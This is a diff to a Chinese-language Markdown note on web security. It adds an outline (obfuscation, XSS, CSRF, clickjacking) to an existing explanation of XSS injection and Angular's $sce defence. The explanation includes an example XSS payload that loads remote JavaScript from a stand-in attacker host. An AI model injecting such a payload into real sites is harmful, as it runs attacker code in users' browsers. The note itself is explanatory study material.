@@ -1,3 +1,10 @@
+## 大纲
+* js代码加密，混淆，base64 
+* XSS攻击
+* CXRF攻击
+* 界面操作劫持
+* 挖掘XSS攻击的一些场景
+
 ## XSS攻击
 主要是注入脚本，如论坛里面用户输入`<script>alert();</script>`，页面回显的时候如果没有处理js脚本，就可能造成攻击。angular的$sce就是用来处理XSS攻击的。`<script>$.getScript('http://www.hack.com/index.js');</script>`
 
